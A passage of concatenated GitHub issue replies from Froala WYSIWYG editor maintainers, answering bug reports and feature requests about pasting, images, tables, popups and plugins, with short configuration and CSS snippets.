sanitizer on server side to remove the HTML entities and keep only the text.. @ryanholte When the editor is empty it would return an empty string. . Nice catch. \ud83d\udc4d . @jfrei please make a jsFiddle or CodePen to reproduce this. Thank you.. Closing this due to lack of response. Would be happy to look into it if you could provide a jsFiddle so that we can see the problem. Thanks.. Last commit adds this possibility and it also adds a parameter called aviaryOptions which can be used to override the default options.. It looks like this option is not used because the editor is making use of the default block tags rather than using a custom list. It should be removed from there. \nGood spot! \ud83d\udc4d . @wrporter that behavior is correct, refresh callback should not be called on showing a dropdown or popup because no change is made inside the editor. Creating a dropdown and using the html property within it would be a better approach because that would self-close the dropdown when you click on another dropdown or popup. \nhttps://www.froala.com/wysiwyg-editor/docs/concepts/custom/dropdown. @raerae13 the clear formatting feature is designed to remove only the inline styles, not the ones for H1, H2, etc. Those are considered block styles and should not be removed that way. If you would like to implement it that way, I would to use the following approach:\n1. Create a custom button\n2. Within the custom button use selection.blocks to get the current blocks\n3. Remove the styles you don't want on them. Looks like a duplicate of #2004.. This is the intended behavior for P tags inside table cells.. @largeden I am not sure I understand exactly how to reproduce this? Could you please offer few more details? Maybe a step by step? Thanks a lot!. @largeden could you please try with the current master from Github and let us know if the problem is fixed?. @largeden could you please check it again now? . Thanks for helping us to nail it \ud83d\ude03 .. See https://www.froala.com/wysiwyg-editor/docs/options#requestHeaders.. Oh, you could use use fileUploadParams for that.. Yes, froala_styles.css file is required.. @ellandebasque ng2-froala-editor is not officially provided by us. Please use https://github.com/froala/angular2-froala-wysiwyg instead.. Please see: https://www.froala.com/wysiwyg-editor/docs/concepts/image/manager.. By default, the editor is switching to the next input on the page when you hit the TAB key. If you want to disable it, then you could use the tabSpaces option.. Thank you for your suggestion. I marked this as a feature-request and it is already on our TODO list.. That is the intended behavior. Quotes are designed not to allow creating a new line inside them.. @rugarcialopez would it be possible to provide more details about the use case you have for this?\nUnfortunately, V2 was not designed to allow this and this issue will remain a wontfix for now. Additional details you could provide would help us to better understand your needs and design further editor major versions to accommodate such cases as well.. We just updated the CodePen.. @riccardomessineo we just tried to reproduce this on the latest editor version and the issue appears to be fixed. If you still have the problem, please let us know.. @Wuyialex when using toolbarVisibleWithoutSelection: false, the inline toolbar should not appear when you type or end typing.. @largeden thanks for helping us to nail this down. All should be fixed now.. You could either not include the Quick Insert plugin or disable it through the pluginsEnabled option.. The best way would be not to include the JS for the Quick Insert plugin. As an alternative, you could use the pluginsEnabled option, where you'd pass all the plugins you want enabled, except the Quick Insert one.. Are you seeing that on our website? Could you please clear cache?. @ellandebasque ng2-froala-editorplugin is not created and maintained by us. The official angular plugin for the editor is: https://github.com/froala/angular2-froala-wysiwyg.. @markedmondson could you please send the document you're pasting from?. Yes, however not all of them are retained by default. See: https://www.froala.com/wysiwyg-editor/docs/options#wordAllowedStyleProps.. @largeden could you please make a recording? We tried and appears to work fine on our website.. @largeden could you please try now?. @jeremylynch could you please send a document you're pasting from?. Duplicate of #1967.. @watsy0007 could you please provide more details?. @barretts could you please let us know the steps to reproduce it on a jsFiddle?https://jsfiddle.net/froala/wc5c3jhk/. That is because when you cancel the image.beforePasteUpload, the image is still inserted as base64 in the original HTML.. It is fixed on the latest master.. This issue has been fixed last week. It should work correctly on Github master.. @shawnpk for tech support please reach us via our website. Thank you.. By default the editor supports the following video providers: Youtube, Vimeo, DailyMotion, Yahoo, Rutube and Vidyard. . You would have to override the following global object:\njs\n$.FE.VIDEO_PROVIDERS = [\n    {\n      test_regex: /^.*((youtu.be)|(youtube.com))\\/((v\\/)|(\\/u\\/\\w\\/)|(embed\\/)|(watch\\?))?\\??v?=?([^#\\&\\?]*).*/,\n      url_regex: /(?:https?:\\/\\/)?(?:www\\.)?(?:m\\.)?(?:youtube\\.com|youtu\\.be)\\/(?:watch\\?v=|embed\\/)?([0-9a-zA-Z_\\-]+)(.+)?/g,\n      url_text: '//www.youtube.com/embed/$1',\n      html: '<iframe width=\"640\" height=\"360\" src=\"{url}?wmode=opaque\" frameborder=\"0\" allowfullscreen></iframe>',\n      provider: 'youtube'\n    },\n    {\n      test_regex: /^.*(?:vimeo.com)\\/(?:channels(\\/\\w+\\/)?|groups\\/*\\/videos\\/\u200b\\d+\\/|video\\/|)(\\d+)(?:$|\\/|\\?)/,\n      url_regex: /(?:www\\.|player\\.)?vimeo.com\\/(?:channels\\/(?:\\w+\\/)?|groups\\/(?:[^\\/]*)\\/videos\\/|album\\/(?:\\d+)\\/video\\/|video\\/|)(\\d+)(?:[a-zA-Z0-9_\\-]+)?/i,\n      url_text: '//player.vimeo.com/video/$1',\n      html: '<iframe width=\"640\" height=\"360\" src=\"{url}\" frameborder=\"0\" allowfullscreen></iframe>',\n      provider: 'vimeo'\n    },\n    {\n      test_regex: /^.+(dailymotion.com|dai.ly)\\/(video|hub)?\\/?([^_]+)[^#]*(#video=([^_&]+))?/,\n      url_regex: /(?:https?:\\/\\/)?(?:www\\.)?(?:dailymotion\\.com|dai\\.ly)\\/(?:video|hub)?\\/?(.+)/g,\n      url_text: '//www.dailymotion.com/embed/video/$1',\n      html: '<iframe width=\"640\" height=\"360\" src=\"{url}\" frameborder=\"0\" allowfullscreen></iframe>',\n      provider: 'dailymotion'\n    },\n    {\n      test_regex: /^.+(screen.yahoo.com)\\/[^_&]+/,\n      url_regex: '',\n      url_text: '',\n      html: '<iframe width=\"640\" height=\"360\" src=\"{url}?format=embed\" frameborder=\"0\" allowfullscreen=\"true\" mozallowfullscreen=\"true\" webkitallowfullscreen=\"true\" allowtransparency=\"true\"></iframe>',\n      provider: 'yahoo'\n    },\n    {\n      test_regex: /^.+(rutube.ru)\\/[^_&]+/,\n      url_regex: /(?:https?:\\/\\/)?(?:www\\.)?(?:rutube\\.ru)\\/(?:video)?\\/?(.+)/g,\n      url_text: '//rutube.ru/play/embed/$1',\n      html: '<iframe width=\"640\" height=\"360\" src=\"{url}\" frameborder=\"0\" allowfullscreen=\"true\" mozallowfullscreen=\"true\" webkitallowfullscreen=\"true\" allowtransparency=\"true\"></iframe>',\n      provider: 'rutube'\n    },\n    {\n      test_regex: /^(?:.+)vidyard.com\\/(?:watch)?\\/?([^.&/]+)\\/?(?:[^_.&]+)?/,\n      url_regex: /^(?:.+)vidyard.com\\/(?:watch)?\\/?([^.&/]+)\\/?(?:[^_.&]+)?/g,\n      url_text: '//play.vidyard.com/$1',\n      html: '<iframe width=\"640\" height=\"360\" src=\"{url}\" frameborder=\"0\" allowfullscreen></iframe>',\n      provider: 'vidyard'\n    }\n  ];. Please make sure you are using the latest version and that you include the URL plugin.. There is a shortcut for enabling the table popup using keyboard only: ALT + SPACE. However, there was an issue and link popup was always showing over. Now if you click on a table cell with a link, the link popup would show, but if you hit ALT + SPACE, the popup one would appear.\nAll shortcuts can be found on our website and they are also listed in the help button from the toolbar.\nIf you have suggestions for improving the UX for this case, we would definitely be interested in hearing them.. Please make sure you have included the froala_style.css file. For that we designed the line breaker plugin, however there isn't too much we can do for it at this moment.. @krecebli after you insert one image, the editor selects that image and when you add the other image, the selected image is probably being replaced. What you should do is to place the selection after the just inserted image or use the html.insert method instead which would be a better approach in this case because the image wouldn't get selected.. See https://github.com/froala/wysiwyg-editor/issues/803#issuecomment-144942840. For tech support, please reach us via our website.. You could place selection markers and then restore selection to have selection after the image. . @krecebli we use this repo for bug tracking. Please contact us via our website for technical support. Thank you.. Thanks! \ud83d\udc4d \n. Are you able to replicate it here: https://github.com/froala/wysiwyg-editor/blob/master/html/3rd-party/bootstrap/modal.html?. @RHinderiks have you added https://github.com/froala/wysiwyg-editor/blob/master/html/3rd-party/bootstrap/modal.html#L44?. @RHinderiks Could you please make a jsFiddle for it or something similar?. @RHinderiks Looking forward for that so that we can help with getting it work correctly for you.. There is going to be a new release in couple of days.. On iOS it is possible to focus inside an input only after the user makes an action (e.g. clicking a button). This is a limitation set by Apple and there is no work around for it.. Hi @VitaliyLogvin! This is on our ToDo list as a feature-request. We don't have ETA for it at this moment. . @tnchuntic would it be possible to make a recording when this error happens? Maybe we can somehow find out in what conditions it happens? . I'm closing this due to lack of response. We'd be happy to look again over it if you could provide more details.. @akomkov it would be helpful to have a recording of the steps to do to replicate it. A jsFiddle would also be handy: https://jsfiddle.net/froala/wc5c3jhk/.. html.insert method is designed to insert the HTML passed to it without making such changes.. We don't have such an option, however what you could do is to listen to the commands.before and commands.after to find the newly inserted table. To find the tables inside the editor, you could do the following inside the callbacks:\njs\neditor.$el.find('table');. Latest commit adds the table.inserted event and creates the possibility to get the inserted table easily:\njs\n$(selector).froalaEditor({\n}).on('froalaEditor.table.inserted', function (e, editor, table) {\n    console.log(table);\n});. @VitaliyLogvin Unfortunately, we don't have a way to test Windows 10 Mobile for now, however this appears to work just fine on Windows 8, Nokia Lumia 930. \nWindows mobile is not on our official browser support list. Anyway, if you know a way to simulate this, we'd be happy to reopen this and check it. Thanks.. That is strange, it works in simulator but not on the physical device. Reopening it.. @setuun the problem is coming from the fact that in editor toolbar, the dropdowns are not actually hidden, but they have a height set to 0 and far on the left of the screen. Because of that inside the sliders the browser has to compute a lot of things. \nThe best approach for it would be to force hiding dropdowns while animation like this: https://codepen.io/Froala/pen/yXdpNB.\ncss\n .fr-dropdown-menu.force-hide {\n   display: none !important;\n}\njs\n$('.main-carousel')\n    .flickity()\n    .on('select.flickity', function () {\n        $('.fr-dropdown-menu').addClass('force-hide')\n    })\n    .on('settle.flickity', function () {\n        $('.force-hide').removeClass('.force-hide')\n    }). @tagalpha for tech support, please contact us via our website: https://www.froala.com/wysiwyg-editor/contact.. @b0gd4n are you able to reproduce this on our website or could you please make a jsFiddle for it? Thank you.. @guiideandrade are you able to reproduce that on our website? Could you please make a jsfiddle or codepen?. @guiideandrade if that is not happening on our website / jsFiddle then most likely it is not a problem from the editor, but rather a conflict with something else inside you app.. Code Mirror should not be included in order to reproduce this issue.. This is the way blockquotes have been designed to work. They should wrap the outer block tag with a quote tag. . This is a wontfix for now as jQuery which we're using for binding events doesn't support that: https://github.com/jquery/jquery/issues/2871. We're working on a jQuery free version where this will be possible. . @various89 could you please make a recording? Are you able to reproduce this on our website?. It is done async. At this point, there is no option for that. I am marking this as an enhancement and we'll add a new event specially for this. In the meanwhile, you could do that by using a timeout after calling the $('.selector').froalaEditor().. Last commit adds the initializationDelayed event which is being called just after the initial setup for initOnClick option.. @Panman8201 here is how it works:\ninitOnClick: true  ---> basic stuff ---> initializationDelayed ---> click ---> initialized\ninitOnClick: false  ----------------------------------------------------------> initialized\n . @kurdin this feature has been added in version 2.6.3, while you're using 2.6.0 in the CodePen: https://www.froala.com/wysiwyg-editor/changelog#2.6.3.. I believe you are talking about typing in the editor the link, not inserting it through the link popup. The links typed in the editor are not designed to use the linkAutoPrefix option, but they are set to follow the current page protocol, by adding the //.. @scribblerp9 it looks like you are not using the latest editor version 2.6.2. Could you please check that?. Closing this due to lack of response. We'd be happy to look again into it if you could provide more details. Thank you.. @indradeepc please contact us via our website for tech support: https://www.froala.com/wysiwyg-editor/contact. Also, it would be helpful if you could send us a link where we can check it.. editorClass adds a custom class to the editor box, while the theme option tells the editor which theme to use. Indeed, theme one uses a class as well in order to achieve that, however the purpose is different.. That is most likely happening because the selection is being lost when you open the custom dialog. The best way to overcome this, would be to save selection using the selection.save method before opening the dialog modal and then call selection.restore just before inserting the HTML.. The following code should to the trick.\n```JS\n$(selector).on('froalaEditor.initialized', function (e, editor) {\n  editor.events.on('drop', function (dropEvent) {\n      // Check if we are dropping files.\n      var dt = dropEvent.originalEvent.dataTransfer;\n  if (dt && dt.files && dt.files.length) {\n    var img = dt.files[0];\n\n    if (img && img.type && img.type.indexOf('image') !== -1) {\n      dropEvent.preventDefault();\n      return false;\n    }\n }\n\n}, true);\n}).froalaEditor();\n. @eloufirhatim The problem is most likely being caused by having a bad link in the response. For tech support please contact us via our website instead of Github.. @hay-wire could you please make a jsFiddle or codePen to reproduce this? Thank you.. @hay-wire I've updated it and the editor initializes now: https://jsfiddle.net/e1vqkohd/2/. Please update it so that we can see the problem. Thank you.. That's because Font Awesome was not included. See: https://jsfiddle.net/e1vqkohd/3/.. @hay-wire if that is not possible to replicate in a jsFiddle then it is most likely related to the way your app is implemented, maybe other scripts interacting with the editor.. The best way would be to remove other scripts from the app and see which one is causing the problem.. Setting typingTimer to 0 would make typing laggy because when the HTML is taken from the editor, there is some processing which should be done. . The minimum `typingTimer` value that can be set is 250ms.. @largeden last commit should fix it. The regular expression for checking URLS is built differently now and it passes most of the validations from https://mathiasbynens.be/demo/url-regex, except the IPs one which IMO should be let as valid input from user in this case. Also, the [RegEx is safe](https://github.com/substack/safe-regex) which is a huge plus. It's built like this:js\n  // Chars to allow.\n  var x = 'a-z\\u0080-\\u009f\\u00a1-\\uffff0-9';\n// Common regex to avoid double chars.\n  $.FE.LinkRegExCommon = '(([' + x + '])|(' + x + ')){1,}[' + x + ']{1,}';\n// PORT:something_else.php\n  $.FE.LinkRegExEnd = '((:[0-9]{1,5})|())((\\/[a-z\\u00a1-\\uffff0-9@?^=%&\\/~+#-_{}]*)|())';\n// Common TLD\n  $.FE.LinkRegExTLD = '((' + $.FE.LinkRegExCommon + ')(\\.(com|net|org|edu|mil|gov|co|biz|info|me|dev)))';\n// Starts with HTTP.\n  $.FE.LinkRegExHTTP = '((ftp|http|https):\\/\\/(www\\.)?' + $.FE.LinkRegExCommon + ')';\n// Authenticate with HTTP.\n  $.FE.LinkRegExAuth = '((ftp|http|https):\\/\\/(www\\.)?[\\u0021-\\uffff]{1,}@' + $.FE.LinkRegExCommon + ')';\n// Starts with WWWW.\n  $.FE.LinkRegExWWW = '(((ftp|http|https):\\/\\/)?www\\.' + $.FE.LinkRegExCommon + '\\.[a-z0-9-]{2,24})';\n// Join.\n  $.FE.LinkRegEx =  '(' + $.FE.LinkRegExTLD + '|' + $.FE.LinkRegExHTTP + '|' + $.FE.LinkRegExAuth + '|' + $.FE.LinkRegExWWW + ')' + $.FE.LinkRegExEnd;\n```\nPS: More details about that in a blog post shortly.. That is not possible to achieve via pastePlain option. This option is designed to remove all the formatting. A better way for achieving what you want would be not to enable the pastePlain option, but use filter options for pasting such as pasteDeniedAttrs or pasteDeniedTags.. @jrust that is happening only when the image display is set to Break Text. If you choose Inline, it would work just the way you are looking for. Unfortunately, when using the Break Text feature, it is not possible because of the way browser renders the cursor to show it.. @nullest please use https://www.froala.com/wysiwyg-editor/docs/options#pasteAllowedStyleProps. Also, make sure you are using the latest 2.6.2 version.. @nullest it is right, the pasteAllowedStyleProps is not correct in docs. We just updated it.. The imageManager.beforeDeleteImage event is triggered after the confirmation message. At this moment it is not possible to replace the built-in confirmation message with a custom one without making changes directly on the editor JS code. I am marking this as a feature-request so that it's in our attention to add it eventually.. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. This is already on our feature-list, however we don't have an ETA for it at this moment.. Please make sure you include the froala_style.min.css file.. This has been fixed few of days ago on the master repo. We update it on our website only after we make an official release. This update will be included in release 2.6.3.. Sure, those should be in docs as well.. It looks this is already fixed on the master branch by e7204ae4108fa0774c06dd48da28d8a01686138a.. Thanks for the feature-request, @jeremylynch!. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. Duplicate of #2078.. It's fixed on the current Github master.. @JSteunou Thanks for reporting it. We fixed that just yesterday here on Github. :). @VitaliyLogvin that is most likely happening because the browser doesn't recognize the image orientation. That should be handled on server side when uploading the image.. @UCIS please make sure you are using the latest version, in the jsFiddle it is version 2.2.4. Also, it is missing the 2nd editor instance. We've added one and appears to work fine: https://jsfiddle.net/4jxr3mfx/13/. If I missed something, please provide couple more details. Thank you.. @ankero please make sure the editor version was updated. You should be able to check that easily by writing $.FE.VERSION in the browser console. If the problem still persist, please try to reproduce this on a jsFiddle/plunker and open the issue directly on the angular repo. Thanks!. @delian7  We don't have a workaround for now.. It is a particular case for applying the inline styles, and the change required for this has quite a lot of implications. Unfortunately, I cannot tell an ETA at this moment.. @delian7 unfortunately, without making changes to #2081 it wouldn't be possible to address this. The inline styles weren't designed with EM in mind and that's why it's not possible to extend the functionality, but it should be made from scratch.. @opalleq @AntiFreez could you please send us the documents you're pasting from? Thanks.. We just checked it, and unfortunately, there is not too much we can do about it. It looks in some cases Internet Explorer is doing some cleanup on the pasted HTML before we can intercept it in JS. That makes it not possible to detect if data is coming from Microsoft Excel.\nThank you all guys for the details!. @nullest could you please send us the file you're trying to upload?. @nullest we couldn't reproduce this. Could you please record a video of it?. It appears to work fine. If you could provide exact steps to reproduce it on our website, we would be happy to look into this.. @MrToph could you please make a jsFiddle or CodePen? Thanks.. @MrToph we tried to reproduce it based on the code you provided, but it appears to work just fine. Could you please provide a jsFiddle or CodePen? We can type in the input without problems.. I am closing this due to lack of response.. @cristianst you should also add tabIndex attribute to inputs: https://jsfiddle.net/froala/wc5c3jhk/1921/.. @loicbisiere sure, you could use the image.uploaded event, return false to cancel the upload chain and then insert the image using the image.insert method. . Sure: \n```js\nfunction parseResponse(resp) {\n  // return the url for image here.\n}\n$('#editor').on('froalaEditor.image.uploaded', function (e, editor, response) {\n  var url = parseResponse(response);\neditor.image.insert(img_url, false, null, editor.image.get(), response);\nreturn false;\n}).froalaEditor();. @adamgins would it be possible to make a recording of it? Thanks.. @adamgins that error is shown there because you haven't added a license key for SCAYT. Please follow the instructions from https://www.froala.com/wysiwyg-editor/examples/web-spell-checker.. @AntiFreez could you please send us the document you're pasting from?. @AntiFreez last commit should fix it in Chrome. For IE, it is a duplicate of #2108.. @Panman8201 we reviewed this, and we believe that is a bit out of the editor scope because of the way for works in the browser. Your solution is a more suitable one.. @vkoves do you think you could ask for this feature on https://wysiwyg-editor-roadmap.froala.com?. @andrewskaggs83 see: https://www.froala.com/wysiwyg-editor/docs/methods#imageManager.show.. @alexmoraru25 could you send us the document you're pasting from?. @JBurtonMCFA are you able to reproduce this on our website?. Could you please make a recording? . We are not able to reproduce it. Please make a recording and let us know additional details about the Windows build and IE specific version. Thanks.. @JBurtonMCFA @jason-hobbs we couldn't replicate this issue. However, we might have a couple of clues. Are you using a 32-bit installation of Windows? Which graphic card do you have?. @jason-hobbs is it possible to somehow share the VM with us?. @jason-hobbs could you please reach us on https://www.froala.com/wysiwyg-editor/contact to see what we can do about this? Thanks.. @forum-is at this moment we don't have a way to replicate this issue. It looks like a user restriction set on the Windows machine, however, we couldn't point what that is.. @SagarKarwa @AntiFreez could one of you guys please make a recording? Thank you.. @Smashr the best way would be to bind to the keydown event and stop the event propagation by using return false.\n``js\n$(selector).on('froalaEditor.initialized', function (e, editor) {\n  editor.events.on('keydown', function () { ... }, true);\n}).froalaEditor();. @boynet could you please send the document from which you're pasting?. @chrisdeeming could you please send us the HTML you have in there? Thank you.. @mikesul we can confirm it is being caused by the autocomplete. Unfortunately, we cannot control that from JS. I am going to close this for now and mark it aswontfix.. @chrisdeeming thanks for the report on this one, unfortunately, there is not too much we could do about it because we cannot find out if the link goes to the other line or not. I am closing this as awontfixfor now.. @ibnesayeed the implications of making such changes are quite significant. It is the way we designed the popups for links to appear in V1. However, here are lots of cases when users are usingA` tags for buttons, and they have paddings or custom content inside them which might create some spacing around the text. \nWe couldn't find a way to satisfy both cases, so when we made V2, we had to go with one of the behaviors. Based on the reports we had about these 2, more users face the padding problem than the ones who run into a link split into two lines.. Thanks for the feedback. We're open to any suggestions.. @webjazz are you able to reproduce this on our website? If so, could you please detail a bit more? Thank you.. There actually is one already. Just add the following code after including the editor CSS (it is in SCSS):\n```sass\n@screen-sm: 768px;\n@screen-md: 992px;\n@screen-lg: 1200px;\n.fr-visibility-helper {\n  @media (min-width: @screen-sm) {\n    margin-left: 1px !important;\n  }\n@media (min-width: @screen-md) {\n    margin-left: 2px !important;\n  }\n@media (min-width: @screen-lg) {\n    margin-left: 3px !important;\n  }\n}\n. With the last commit you could use the following:js\n$(\".selector\").froalaEditor({\n  codeMirror: require('codemirror')\n})\n```. @natcohen could you please make a jsFiddle for it?. @natcohen https://codepen.io/Froala/pen/PpgxGL. @GAntoine are you using the latest editor version?. Yes, please upgrade.. It is because when the image has to be inserted, the editor is no longer visible. The best solution would be to disable closing the modal while there is an image upload.. @SagarKarwa what windows version are you using?. @SagarKarwa could you please make a recording? Thank you.. We're closing this due to lack of response. Would be happy to look over it if we'd get more details.. @davidtorroija it would be better just to use the editor zIndex option instead.. @loicbisiere for tech support, please reach us via our website. Thank you.. \ud83d\udc4d . @jkhaoqi110 it appears this is not happening on the latest version. Are you able to reproduce it on our website?. I am closing this as it appears to work fine with the latest editor version. Please let us know if you can reproduce it on our website.. Could you please make a jsFiddle for it?. @Smashr the way @largeden suggested is the right way of doing this. A step should be stored before changing the HTML and another one just after that.. @raerae13 unfortunately, because of the way browsers are displaying elements we don't have a fix for this. One possible workaround would be to add the following CSS, however, we don't want to add it by default in the editor because it would change the way lists are designed to work by default in the browser.\ncss\n.fr-view ol, .fr-view ul {\n  list-style-position: inside;\n}. @largeden nice catch!. @huhu213 @docikaci which is the error message you get in console when listening to the image.error event?. Closing this issue due to lack of response. Would be happy to check it if you could provide the requested details. Thank you.. In the latest version, the Aviary plugin is no longer included in the pkgd file and it should be included separately. . It will be included in the next release 2.6.5.. @peca11 this is rather related to how the browser works rather than the editor. If you'd try to paste the same content in a contenteditable=\"true\" element, then the browser would keep pasting several times. If you would like to prevent that in the editor, you could use the paste.before and paste.after events to cancel other pasting actions being done. However, it might be possible that the browser keeps them in a stack and fires another one just after the first paste has finished.. @SeanKendle Thanks for the suggestion, however, we believe this should be made consistent with the other buttons in the editor rather than adding a new way of doing it, especially for the Quick Insert toolbar. We don't accept PR directly here so I am closing this for now.. Official way of doing it starting with v2.7.0: https://www.froala.com/wysiwyg-editor/examples/custom-quick-insert-button.. @xandervdm please send us a link to the text you're pasting into the editor. . @xandervdm we just tried to reproduce it without success. I think we're missing something. Could you please make a recording?. @xandervdm we don't have an ETA for it, however we were able to reproduce it now and there should be a fix shortly.. https://github.com/froala/wysiwyg-editor/issues/1358#issuecomment-228046725. Unfortunately, in order to have the buttons work correctly, it is necessary to prevent the scroll event on them for the Android OS. While I can see how this affects the UX, it is the best solution we could find to use the buttons without losing the selection inside the editor. It appears that on Android even the slightest move of the finger when tapping a button triggers the scroll event and sometimes the browser fires the scroll event before the touchstart one.\nFor now, I am going to close this and mark it as wontfix. We might review it on further major editor version. However, we're not going to change this behavior in the current major version V2.. @steffenweber thanks for the suggestions, we'll look into them.. See: https://www.froala.com/wysiwyg-editor/docs/options#imageDefaultWidth.. @jtrain Nice catch. Thanks for the suggestion.. Here is what should do for that:\njs\nvar editor = $('#editor').data('froala.editor');\n$.FE.COMMANDS.yourCommand.callback.call(editor);. @SidKH That is right, I updated the comment. \nAnother way to call a command would be by the following code. This should do the undo/focus things automatically: editor.commands.exec('yourCommand');.. @Artenes the Professional and OEM licenses come with the source code unminified. We do not provide the unminified code prior to purchasing a license.. @irphilli could you please make a recording?. That is happening because the image is below the text. To have text on its right, you should move the picture up by dragging it in front of the text you want to go to the right.. Most likely when you display the content it is not being marked as safe HTML. Please set a zIndex option in the editor higher than the Bootstrap Modal: https://www.froala.com/wysiwyg-editor/docs/options#zIndex. @ShanmugaPriyanV could you please make a jsFiddle for it?. @AntiFreez to show the table popup editing correctly, you should set the zIndex option for the editor: \njs\nangular.module('froala', [])\n.value('froalaConfig', {\n    zIndex: 3000\n})\nAlso, inside modals, it is best to set the scrollableContainer option as well, so that all controls are being placed relative to the modal and not the body of the page.. @AntiFreez we did an additional check and it appears that the problem is actually coming from the transform CSS property of the modal. It should be overridden by setting it to none.\n\n. @ShanmugaPriyanV the unminified JS is available under the Professional/OEM licenses for download inside your account.. If you are inserting text in the editor using the html.insert or html.set, you should also use the undo.saveStep method in order to add the changes to the undo stack. . That's because the inserted HTML should have the class fr-deletable. We'll put an update shortly. . @george-norris-salesforce could you please send us a document you're pasting from?. @SeanKendle could you please make a jsFiddle for it?. @will-newmarch Unfortunately, without having a consistent way of reproducing this it makes it impossible for us to fix it. While we've been able to reproduce it when typing and selecting chaotic, we couldn't find a logical way to reproduce it even when we recorded the screen and watched it in slow-motion. I am going to close this issue for now, and we would be happy to look again into it if there is a clear way to reproduce it.. @largeden thanks for the additional investigation. We're going to check it shortly.. @largeden great catch! We're reverting it for now to the previous behavior.. Duplicate of #2166 . Could you please detail what you mean by html change event?. We don't have an option for getting the changes from HTML view. A change in HTML view is considered finished when switching back to the editor. That's because rendering it before that, would involve a lot of computation to clean up the HTML each time and make it valid in case it's not.. @benorudolf could you please send us a link to a page from where we can copy the HTML you're having problems with?. We just checked this and the way the editor is currently pasting is the correct one. The pasted content is not a new paragraph, but a line inside an existing paragraph. Here is a screenshot of it for the content above.\n\n. @benorudolf for such cases we would recommend changing the enter option to $.FE.ENTER_BR.. Yes, that would be possible when using enter: $.FroalaEditor.ENTER_BR. This mode is similar to the way Google Docs handles new lines.. Yes, please reach us via https://www.froala.com/wysiwyg-editor/contact and our support team will help you with this.. Please make sure you're using the latest editor version.. The editor is using fr- classes in order to enable rich features such as image alignment or image display. If you don't want these features, the easiest way around it would be not to include these features.. These classes are getting into the content only when they are being used for rich features to display the content. For example, there is fr-dib which is used for displaying the image a block with no text next to it. This class would, of course, be present in the output because you want the output to look just like the way the content was written.. fr-draggable is being added as a way to tell the editor that the specific element is draggable. It can be used not only on images/videos but it can be used to extend the editor with other draggable elements as well. This is the reason why it is not being removed.. I believe there is a misunderstanding because you are not taking into consideration editing the content for the 2nd time. If someone would extend the editor and create a special area which can be moved around by using the fr-draggable, the 2nd time when the content is being edited, the editor wouldn't know that the particular area should is draggable. . Yes, it is doing that for images and videos, however, it couldn't have done that for custom areas which could be dragged. While I appreciate your suggestion, this is not something we're going to change, at least in the current major version because it might impact existing users.. It doesn't make sense to add such an option just to have these values there. Here is the list of them: \nfr-draggable, fr-dragging, fr-uploading, fr-selected-cell, fr-active.. Thanks for the suggestion, really appreciate it. \nNo, we don't have an option for renaming the styling classes.. With the latest commit, you could use the following code to set protocols before initializing the editor.\njs\n$.FE.LinkProtocols = ['mailto', 'tel', 'sms', 'notes', 'data', 'gid'];. We're closing this for now and will continue this discussion on email.. @mukk85 this is fixed on the Github master.. @Brisstor are you able to reproduce that on our website? https://www.froala.com/wysiwyg-editor/examples/full-featured. That's because you should remove the image. See https://jsfiddle.net/mLsajwe1/4/ and make sure you're using the version 2.6.5.. @alexcrawford could you please make a recording?. @alexcrawford few more questions \ud83d\ude04 \n1. Which Chrome build version are you using?\n2. Could you send us the image you're dropping there?\n3. Could you make a screenshot of the entire error?. @alexcrawford yesterday \ud83d\ude04. https://www.froala.com/wysiwyg-editor/changelog. @jrhess3 are you seeing this problem on https://github.com/froala/wysiwyg-editor/blob/master/html/toolbar/offset.html?. @jrhess3 it appears to work just fine on El Capitan 10.11.6. For now, we do not support this feature on mobile devices.. @NathanDubord please see: https://www.froala.com/wysiwyg-editor/docs/overview#frontend.. @loicbisiere we're not using such a selector. Please check if you are not extending the editor somehow and using it.. It can be done as described in the last comment. We don't plan to add this as default because there are also errors which might happen on the server side and showing those to users is not ok. . @jpgilchrist here is a similar solution I recommend some time ago: https://github.com/froala/wysiwyg-editor/issues/1358#issuecomment-228046725/. Sure they work. See: https://www.froala.com/wysiwyg-editor.. @florinpopescu please send us the document you're pasting from.. @francisco-oktana I just requested access to the document.. @francisco-oktana the formats come from Google Docs in the style attribute. By default, the editor is designed to remove the style attribute, however, you can change that easily using the pasteDeniedAttrs option. Further on, you can also filter which style props you want to keep with the pasteAllowedStyleProps.. It's on our TODO list to make something similar, however, we don't have any ETA for it now.. @natcohen @sandeepsukhija we've just updated the CodePen. https://codepen.io/Froala/pen/ZeZzEN. @natcohen on the example from ichord, they appear to be using an older version, not the latest one. You should be able to get that behavior with version 1.4.0 or similar. . @charleseswine the editor is using HTML code for editing. Moustache tags are not recognized by the browser as valid HTML tags and that's why they are being removed. . @marinoboscolo would it be possible to make a recording? Thank you.. @marinoboscolo are you able to reproduce this on our website?. I am closing this for now. We would be happy to look over it you could send us a link to a demo page where we can reproduce it. Thank you in advance.. @SwintDC it has already been fixed in the latest commit. We're going to publish this fix officially in a couple of hours.. Yes, that's the one that fixes it: https://github.com/froala/wysiwyg-editor/commit/fed2f09d86f21b9edf47f22c741408aaad5ae900.. Great news for you. We just added Embedlly as a plugin to the editor and starting with release 2.6.7 that is going to be possible. Make sure you follow us here for updates: https://www.froala.com/wysiwyg-editor/download#updates.. @thedotedge we just published the new version and you can play with it on our website already.. @Rupke75 would it be possible to send us a recording as well? Thanks in advance.. @Rupke75 by default, the table side adapts to fit the content. If you would like to prevent that, all you should do is to add the following CSS rules on your application:\n```css\n.fr-view table {\n  table-layout: fixed;\n}\n.fr-view table td, .fr-view table th {\n  word-wrap: break-word;\n} \n``. @danpolites your issues are related to your integration, not to the editor. If you have a demo page where we can see this problem, please contact us on https://www.froala.com/wysiwyg-editor/contact. Thank you in advance.. Indeed, there appears to be a problem in Safari because of thatcontenteditable=\"false\"`. \nNow, coming to the figure and figcaption. We chose not to use them because browsers do not allow using the figure tag inside p tags. Thus, having images with captions inside p tags wouldn't be possible. We are really interested in finding out more details about what you think on this matter as we've had lots of talks about it before doing this change.. @largeden @FinesseRus I believe you misunderstood my explanation. There are cases when the users have image inside a P tag. Something like this: <p>foo <img> bar</p>. If we'd wrap the image with a figure, the browsers would move it outside of the paragraph.. @largeden @FinesseRus thank you guys for the feedback. We're going to analyze the options available there and take a decision based on that.. The last commit fixes the problem of the image caption not working on iOS. For the moment, we're going to keep the SPAN structure for compatibility with previous editor versions. Adding figure is a breaking change and 